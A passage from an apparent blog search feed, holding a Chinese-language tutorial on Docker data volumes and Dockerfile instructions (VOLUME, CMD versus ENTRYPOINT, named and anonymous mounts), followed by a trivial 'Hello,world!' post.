提供一些用于持续存储或共享数据的特性：</p><p>卷的设计目的就是数据的持久化，完全独立于容器的生存周期，因此Docker不会在容器删除时删除其挂载的数据卷。</p><p>特点：</p><p>1、数据卷可在容器之间共享或重用数据</p><p>2、卷中的更改可以直接生效</p><p>3、数据卷中的更改不会包含在镜像的更新中</p><p>4、数据卷的生命周期一直持续到没有容器使用它为止</p><h2 id="使用数据卷"><a href="#使用数据卷" class="headerlink" title="使用数据卷"></a>使用数据卷</h2><h3 id="方式一：命令行"><a href="#方式一：命令行" class="headerlink" title="方式一：命令行"></a>方式一：命令行</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 命令</span><br><span class="line">docker run -it -v 宿主机绝对路径目录:容器内目录 镜像名</span><br><span class="line"></span><br><span class="line"># 测试</span><br><span class="line">[root@d3f4u1t ~]# docker run -it -v /home/ceshi:/home centos /bin/bash</span><br></pre></td></tr></table></figure></div><p>挂载分为匿名挂载和具名挂载</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"># 匿名挂载</span><br><span class="line">-v 容器内路径</span><br><span class="line">docker run -d -P --name nginx01 -v /etc/nginx nginx</span><br><span class="line"># 匿名挂载的缺点，就是不好维护，通常使用命令 docker volume维护</span><br><span class="line">docker volume ls</span><br><span class="line"></span><br><span class="line"># 具名挂载</span><br><span class="line">-v 卷名:/容器内路径</span><br><span class="line">docker run -d -P --name nginx02 -v nginxconfig:/etc/nginx nginx</span><br><span class="line"></span><br><span class="line"># 查看挂载的路径</span><br><span class="line">[root@d3f4u1t ~]# docker volume inspect nginxconfig</span><br><span class="line">[</span><br><span class="line">&#123;</span><br><span class="line">&quot;CreatedAt&quot;: &quot;2020-05-13T17:23:00+08:00&quot;,</span><br><span class="line">&quot;Driver&quot;: &quot;local&quot;,</span><br><span class="line">&quot;Labels&quot;: null,</span><br><span class="line">&quot;Mountpoint&quot;: &quot;/var/lib/docker/volumes/nginxconfig/_data&quot;,</span><br><span class="line">&quot;Name&quot;: &quot;nginxconfig&quot;,</span><br><span class="line">&quot;Options&quot;: null,</span><br><span class="line">&quot;Scope&quot;: &quot;local&quot;</span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># 怎么判断挂载的是卷名而不是本机目录名？</span><br><span class="line">不是/开始就是卷名，是/开始就是目录名</span><br><span class="line"># 改变文件的读写权限</span><br><span class="line"># ro: readonly</span><br><span class="line"># rw: readwrite</span><br><span class="line"></span><br><span class="line"># 指定容器对我们挂载出来的内容的读写权限</span><br><span class="line">docker run -d -P --name nginx02 -v nginxconfig:/etc/nginx:ro nginx</span><br><span class="line">docker run -d -P --name nginx02 -v nginxconfig:/etc/nginx:rw nginx</span><br></pre></td></tr></table></figure></div><h3 id="方式二：dockerfile"><a href="#方式二：dockerfile" class="headerlink" title="方式二：dockerfile"></a>方式二：dockerfile</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"># 1、我们在宿主机 /home 目录下新建一个 docker-test-volume文件夹</span><br><span class="line">[root@d3f4u1t home]# mkdir docker-test-volume</span><br><span class="line"></span><br><span class="line"># 说明：在编写DockerFile文件中使用 VOLUME 指令来给镜像添加一个或多个数据卷</span><br><span class="line">VOLUME[&quot;/dataVolumeContainer1&quot;,&quot;/dataVolumeContainer2&quot;,&quot;/dataVolumeContainer</span><br><span class="line">3&quot;]</span><br><span class="line"></span><br><span class="line"># 出于可移植和分享的考虑，我们之前使用的 -v 主机目录:容器目录 这种方式不能够直接在</span><br><span class="line">DockerFile中实现。</span><br><span class="line"># 由于宿主机目录是依赖于特定宿主机的，并不能够保证在所有宿主机上都存在这样的特定目录.</span><br><span class="line"></span><br><span class="line"># 2、编写DockerFile文件</span><br><span class="line">[root@d3f4u1t docker-test-volume]# pwd</span><br><span class="line">/home/docker-test-volume</span><br><span class="line">[root@d3f4u1t docker-test-volume]# vim dockerfile1</span><br><span class="line">[root@d3f4u1t docker-test-volume]# cat dockerfile1</span><br><span class="line"># volume test</span><br><span class="line">FROM centos</span><br><span class="line">VOLUME [&quot;/dataVolumeContainer1&quot;,&quot;/dataVolumeContainer2&quot;]</span><br><span class="line">CMD echo &quot;-------end------&quot;</span><br><span class="line">CMD /bin/bash</span><br><span class="line"></span><br><span class="line"># 3、build后生成镜像，获得一个新镜像 d3f4u1t/centos</span><br><span class="line">docker build -f /home/docker-test-volume/dockerfile1 -t kuangshen/centos . </span><br><span class="line">#注意最后有个.</span><br><span class="line"></span><br><span class="line"># 4、启动容器</span><br><span class="line">[root@d3f4u1tn docker-test-volume]# docker run -it 0e97e1891a3d /bin/bash </span><br><span class="line">#启动容器</span><br><span class="line">[root@f5824970eefc /]# ls -l</span><br><span class="line">total 56</span><br><span class="line">lrwxrwxrwx 1 root root 7 May 11 2019 bin -&gt; usr/bin</span><br><span class="line">drwxr-xr-x 2 root root 4096 May 11 11:55 dataVolumeContainer1 # 数据卷目录</span><br><span class="line">drwxr-xr-x 2 root root 4096 May 11 11:55 dataVolumeContainer2 # 数据卷目录</span><br><span class="line">drwxr-xr-x 5 root root 360 May 11 11:55 dev</span><br><span class="line">drwxr-xr-x 1 root root 4096 May 11 11:55 etc</span><br><span class="line">drwxr-xr-x 2 root root 4096 May 11 2019 home</span><br><span class="line">.....</span><br><span class="line"># 问题:通过上述步骤，容器内的卷目录地址就已经知道了，但是对应的主机目录地址在哪里呢？</span><br><span class="line"></span><br><span class="line"># 5、我们在数据卷中新建一个文件</span><br><span class="line">[root@f5824970eefc dataVolumeContainer1]# pwd</span><br><span class="line">/dataVolumeContainer1</span><br><span class="line">[root@f5824970eefc dataVolumeContainer1]# touch container.txt</span><br><span class="line">[root@f5824970eefc dataVolumeContainer1]# ls -l</span><br><span class="line">total 0</span><br><span class="line">-rw-r--r-- 1 root root 0 May 11 11:58 container.txt</span><br><span class="line"></span><br><span class="line"># 6、查看下这个容器的信息</span><br><span class="line">[root@d3f4u1t ~]# docker inspect 0e97e1891a3d</span><br><span class="line"># 查看输出的Volumes</span><br><span class="line">&quot;Volumes&quot;: &#123;</span><br><span class="line">&quot;/dataVolumeContainer1&quot;: &#123;&#125;,</span><br><span class="line">&quot;/dataVolumeContainer2&quot;: &#123;&#125;</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line"># 7、这个卷在主机对应的默认位置</span><br></pre></td></tr></table></figure></div><h2 id="数据卷容器"><a href="#数据卷容器" class="headerlink" title="数据卷容器"></a>数据卷容器</h2><p>命名的容器挂载数据卷，其他容器通过挂载这个（父容器）实现数据共享，挂载数据卷的容器，称之为数据卷容器。</p><p><strong>容器之间配置信息的传递，数据卷的生命周期一直持续到没有容器使用它为止。</strong></p><p><strong>存储在本机的文件则会一直保留</strong></p><h1 id="dockerfile"><a href="#dockerfile" class="headerlink" title="dockerfile"></a>dockerfile</h1><h2 id="何为dockerfile"><a href="#何为dockerfile" class="headerlink" title="何为dockerfile"></a>何为dockerfile</h2><p>dockerfifile是用来构建Docker镜像的构建文件，是由一系列命令和参数构成的脚本。</p><p>构建步骤：</p><p>1、编写DockerFile文件</p><p>2、docker build 构建镜像</p><p>3、docker run</p><h2 id="构建dockerfile"><a href="#构建dockerfile" class="headerlink" title="构建dockerfile"></a>构建dockerfile</h2><p><strong>基础知识：</strong></p><p>1、每条保留字指令(命令)都必须为大写字母且后面要跟随至少一个参数</p><p>2、指令按照从上到下，顺序执行</p><p>3、# 表示注释</p><p>4、每条指令都会创建一个新的镜像层，并对镜像进行提交</p><p><strong>流程：</strong></p><p>1、docker从基础镜像运行一个容器</p><p>2、执行一条指令并对容器做出修改</p><p>3、执行类似 docker commit 的操作提交一个新的镜像层</p><p>4、Docker再基于刚提交的镜像运行一个新容器</p><p>5、执行dockerfifile中的下一条指令直到所有指令都执行完成！</p><h2 id="dockerfile指令"><a href="#dockerfile指令" class="headerlink" title="dockerfile指令"></a>dockerfile指令</h2><h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">FROM # 基础镜像，当前新镜像是基于哪个镜像的</span><br><span class="line">MAINTAINER # 镜像维护者的姓名混合邮箱地址</span><br><span class="line">RUN # 容器构建时需要运行的命令</span><br><span class="line">EXPOSE # 当前容器对外保留出的端口</span><br><span class="line">WORKDIR # 指定在创建容器后，终端默认登录的进来工作目录，一个落脚点</span><br><span class="line">ENV # 用来在构建镜像过程中设置环境变量</span><br><span class="line">ADD # 将宿主机目录下的文件拷贝进镜像且ADD命令会自动处理URL和解压tar压缩包</span><br><span class="line">COPY # 类似ADD，拷贝文件和目录到镜像中！</span><br><span class="line">VOLUME # 容器数据卷，用于数据保存和持久化工作</span><br><span class="line">CMD # 指定一个容器启动时要运行的命令，dockerFile中可以有多个CMD指令，但只有最</span><br><span class="line">后一个生效！</span><br><span class="line">ENTRYPOINT # 指定一个容器启动时要运行的命令！和CMD一样</span><br><span class="line">ONBUILD # 当构建一个被继承的DockerFile时运行命令，父镜像在被子镜像继承后，父镜像的ONBUILD被触发</span><br></pre></td></tr></table></figure></div><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20221230231454355.png" alt="image-20221230231454355"></p><h3 id="CMD-和-ENTRYPOINT-的区别"><a href="#CMD-和-ENTRYPOINT-的区别" class="headerlink" title="CMD 和 ENTRYPOINT 的区别"></a>CMD 和 ENTRYPOINT 的区别</h3><p>我们之前说过，两个命令都是指定一个容器启动时要运行的命令</p><p><strong>CMD</strong>：Dockerfile 中可以有多个CMD 指令，但只有最后一个生效，CMD 会被 docker run 之后的参数替换</p><p><strong>ENTRYPOINT</strong>： docker run 之后的参数会被当做参数传递给 ENTRYPOINT，之后形成新的命令组合</p>]]></content>
      
      
      <categories>
          
          <category> 电子取证 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello,world!</title>
      <link href="/2020/10/01/hello-world/"/>
      <url>/2020/10/01/hello-world/</url>
      
        <content type="html"><![CDATA[<div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> d3f4u1t</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;Hello,world!&quot;</span>)</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> 杂记 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
